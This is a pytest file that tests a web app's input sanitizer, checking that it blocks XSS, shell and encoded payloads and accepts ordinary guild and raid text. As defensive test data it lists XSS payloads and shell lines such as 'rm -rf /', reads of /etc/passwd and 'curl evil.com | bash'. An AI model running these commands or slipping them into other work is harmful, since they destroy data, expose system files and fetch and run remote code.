"""Comprehensive tests for the shared sanitizer (app/utils/sanitizer.py).

Tests cover:
- HTML/XSS injection blocking (script, iframe, event handlers, etc.)
- Shell command injection blocking ($(cmd), backticks, pipes, redirects)
- Encoding obfuscation blocking (hex, unicode, HTML entities)
- Translation placeholder validation (allowed vs unknown variables)
- Translation key format validation
- Length limit enforcement
- Safe content acceptance (emoji, normal text, allowed placeholders)
- General text sanitization (used for descriptions, notes, instructions)
"""

from __future__ import annotations

import pytest

from app.utils.sanitizer import (
    check_dangerous_content,
    sanitize_text,
    sanitize_translation,
    validate_translation_key,
    get_allowed_translation_variables,
    ALLOWED_TRANSLATION_VARIABLES,
    MAX_TEXT_LENGTH,
    MAX_TRANSLATION_LENGTH,
    MAX_KEY_LENGTH,
)


# ── HTML / XSS injection ────────────────────────────────────────────────


class TestXSSBlocking:
    """HTML and script injection attempts must be rejected."""

    @pytest.mark.parametrize("payload", [
        "<script>alert('xss')</script>",
        "<SCRIPT>document.cookie</SCRIPT>",
        "< script >alert(1)</ script >",
        '<iframe src="evil.com"></iframe>',
        "<IFRAME SRC=javascript:alert('XSS')>",
        '<object data="evil.swf">',
        '<embed src="evil.swf">',
        '<link rel="stylesheet" href="evil.css">',
        '<style>body{background:url(evil)}</style>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        'javascript:alert(1)',
        'JAVASCRIPT:alert(document.domain)',
        'data:text/html,<script>alert(1)</script>',
        'vbscript:MsgBox("xss")',
        '<div onclick=alert(1)>click</div>',
        '<input onfocus=alert(1)>',
        '<body onload=alert(1)>',
        '<a onmouseover=alert(1)>hover</a>',
        '<form onsubmit=alert(1)>',
        '<select onchange=alert(1)>',
        '<input onblur=alert(1)>',
    ])
    def test_xss_payloads_blocked(self, payload):
        error = check_dangerous_content(payload)
        assert error is not None, f"XSS payload not blocked: {payload}"

    @pytest.mark.parametrize("payload", [
        "<script>alert('xss')</script>",
        '<iframe src="evil"></iframe>',
        'javascript:void(0)',
    ])
    def test_sanitize_text_rejects_xss(self, payload):
        clean, error = sanitize_text(payload)
        assert error is not None
        assert clean == ""

    @pytest.mark.parametrize("payload", [
        "<script>alert('xss')</script>",
        '<img onerror=alert(1) src=x>',
    ])
    def test_sanitize_translation_rejects_xss(self, payload):
        clean, error = sanitize_translation(payload)
        assert error is not None
        assert clean == ""


# ── Shell command injection ──────────────────────────────────────────────


class TestShellInjection:
    """Shell escape and command injection attempts must be rejected."""

    @pytest.mark.parametrize("payload", [
        "$(rm -rf /)",
        "$(cat /etc/passwd)",
        "`ls -la`",
        "`whoami`",
        "${PATH}",
        "${HOME}",
        "; rm -rf /",
        "; cat /etc/passwd",
        "; wget http://evil.com/shell.sh",
        "; curl evil.com | bash",
        "| bash",
        "| sh -c 'evil'",
        "| python -c 'import os'",
        "| node -e 'process.exit()'",
        "; exec /bin/sh",
        "; eval dangerous",
        "> /etc/passwd",
        "> /tmp/evil",
    ])
    def test_shell_injection_blocked(self, payload):
        error = check_dangerous_content(payload)
        assert error is not None, f"Shell injection not blocked: {payload}"


# ── Encoding obfuscation ────────────────────────────────────────────────


class TestEncodingObfuscation:
    """Encoded payloads used to bypass filters must be rejected."""

    @pytest.mark.parametrize("payload", [
        "\\x3cscript\\x3e",
        "\\u003cscript\\u003e",
        "&#60;script&#62;",
        "&#x3C;script&#x3E;",
        "&#x3c;script&#x3e;",
        "&#60;img src=x onerror=alert(1)&#62;",
    ])
    def test_encoding_obfuscation_blocked(self, payload):
        error = check_dangerous_content(payload)
        assert error is not None, f"Encoded payload not blocked: {payload}"


# ── Safe content ─────────────────────────────────────────────────────────


class TestSafeContent:
    """Normal text, emoji, and allowed patterns must be accepted."""

    @pytest.mark.parametrize("text", [
        "Hello, world!",
        "Welcome to the guild!",
        "🏰 Your castle awaits",
        "⚔️ Raid starts at 8pm",
        "Use potions & flasks",
        "It's a 25-man raid",
        "Special chars: @#$%^&*()",
        "Multi\nline\ntext",
        "Diacritics: ąęśćżźó ü ñ",
        "Cyrillic: Привет мир",
        "Numbers: 12345 and math: 1+2=3",
        "Parentheses: test (value) [array] {curly}",
        "",
    ])
    def test_safe_text_accepted(self, text):
        error = check_dangerous_content(text)
        assert error is None, f"Safe text rejected: {text}"

    @pytest.mark.parametrize("text", [
        "Hello, world!",
        "🏰 Your guild awaits!",
        "Bring flasks & potions",
        "Raid starts at 8pm — be on time!",
    ])
    def test_sanitize_text_accepts_safe(self, text):
        clean, error = sanitize_text(text)
        assert error is None
        assert clean == text.strip()

    def test_sanitize_text_strips_whitespace(self):
        clean, error = sanitize_text("  hello world  ")
        assert error is None
        assert clean == "hello world"

    def test_empty_string_accepted(self):
        clean, error = sanitize_text("")
        assert error is None
        assert clean == ""


# ── Length limits ────────────────────────────────────────────────────────


class TestLengthLimits:
    def test_text_within_default_limit(self):
        text = "a" * MAX_TEXT_LENGTH
        clean, error = sanitize_text(text)
        assert error is None
        assert len(clean) == MAX_TEXT_LENGTH

    def test_text_exceeds_default_limit(self):
        text = "a" * (MAX_TEXT_LENGTH + 1)
        clean, error = sanitize_text(text)
        assert error is not None
        assert "5,000" in error

    def test_custom_max_length(self):
        text = "a" * 101
        clean, error = sanitize_text(text, max_length=100)
        assert error is not None
        assert "100" in error

    def test_translation_within_limit(self):
        text = "a" * MAX_TRANSLATION_LENGTH
        clean, error = sanitize_translation(text)
        assert error is None

    def test_translation_exceeds_limit(self):
        text = "a" * (MAX_TRANSLATION_LENGTH + 1)
        clean, error = sanitize_translation(text)
        assert error is not None

    def test_non_string_rejected(self):
        clean, error = sanitize_text(123)
        assert error is not None
        assert "string" in error.lower()


# ── Translation placeholder validation ───────────────────────────────────


class TestTranslationPlaceholders:
    """Only whitelisted {variable} names are allowed in translations."""

    @pytest.mark.parametrize("text", [
        "Welcome, {name}!",
        "{count} members online",
        "Maximum {limit} guilds",
        "{count}/{max} slots used",
        "Playing on {realm}",
        "Expires on {date}",
        "Logged in as {username}",
        "You joined {guild}",
        "{character} was removed",
        "{size}-player raid",
        "{minutes} minutes late",
        "Status: {status}",
        "{field} is required",
        "your{'@'}email.com",
    ])
    def test_allowed_placeholders_accepted(self, text):
        clean, error = sanitize_translation(text)
        assert error is None, f"Allowed placeholder rejected: {text}"

    @pytest.mark.parametrize("bad_var", [
        "password", "secret", "token", "cookie",
        "env", "PATH", "HOME", "admin_key",
        "sql_query", "command", "shell",
        "file_path", "database", "connection_string",
    ])
    def test_unknown_placeholders_rejected(self, bad_var):
        text = f"Value is {{{bad_var}}}"
        clean, error = sanitize_translation(text)
        assert error is not None, f"Unknown placeholder accepted: {bad_var}"
        assert bad_var in error

    def test_mixed_good_and_bad_placeholders(self):
        text = "Hello {name}, your {password} is exposed"
        clean, error = sanitize_translation(text)
        assert error is not None
        assert "password" in error

    def test_general_text_allows_any_placeholders(self):
        """sanitize_text does NOT validate placeholders — only sanitize_translation does."""
        text = "Hello {anything_goes}"
        clean, error = sanitize_text(text)
        assert error is None

    def test_get_allowed_variables_returns_list(self):
        variables = get_allowed_translation_variables()
        assert isinstance(variables, list)
        assert "name" in variables
        assert "count" in variables
        assert len(variables) > 20


# ── Translation key validation ───────────────────────────────────────────


class TestTranslationKeyValidation:
    @pytest.mark.parametrize("key", [
        "admin.translations.saved",
        "common.buttons.cancel",
        "guild.settings.title",
        "a",
        "a.b.c.d.e",
        "_private.key",
        "section123.key456",
    ])
    def test_valid_keys(self, key):
        error = validate_translation_key(key)
        assert error is None, f"Valid key rejected: {key}"

    @pytest.mark.parametrize("key,reason", [
        ("", "empty"),
        ("   ", "whitespace only"),
        ("../../../etc/passwd", "path traversal"),
        ("<script>", "html in key"),
        ("key with spaces", "spaces"),
        ("key/with/slashes", "slashes"),
        ("123.starts_with_digit", "starts with digit"),
        (".leading.dot", "leading dot"),
    ])
    def test_invalid_keys(self, key, reason):
        error = validate_translation_key(key)
        assert error is not None, f"Invalid key accepted ({reason}): {key}"

    def test_key_too_long(self):
        key = "a" * (MAX_KEY_LENGTH + 1)
        error = validate_translation_key(key)
        assert error is not None
        assert str(MAX_KEY_LENGTH) in error


# ── Integration: sanitize_text used for service fields ───────────────────


class TestServiceFieldSanitization:
    """Test patterns that match how services use sanitize_text."""

    def test_event_instructions_safe(self):
        clean, error = sanitize_text("Bring flasks and food. Be online 15 min early.")
        assert error is None

    def test_event_instructions_xss(self):
        clean, error = sanitize_text('<script>steal_cookies()</script>')
        assert error is not None

    def test_signup_note_safe(self):
        clean, error = sanitize_text("I might be 5 min late", max_length=1000)
        assert error is None

    def test_signup_note_shell_injection(self):
        clean, error = sanitize_text("$(rm -rf /)", max_length=1000)
        assert error is not None

    def test_tenant_description_safe(self):
        clean, error = sanitize_text("Our WoW guild community!", max_length=2000)
        assert error is None

    def test_tenant_description_xss(self):
        clean, error = sanitize_text('<iframe src="evil.com">', max_length=2000)
        assert error is not None

    def test_raid_notes_safe(self):
        clean, error = sanitize_text("Phase 2: spread out for Defile", max_length=2000)
        assert error is None

    def test_guild_name_safe(self):
        clean, error = sanitize_text("Eternal Legends", max_length=500)
        assert error is None

    def test_custom_field_name_in_error(self):
        clean, error = sanitize_text("a" * 10001, field_name="Instructions")
        assert error is not None
        assert "Instructions" in error
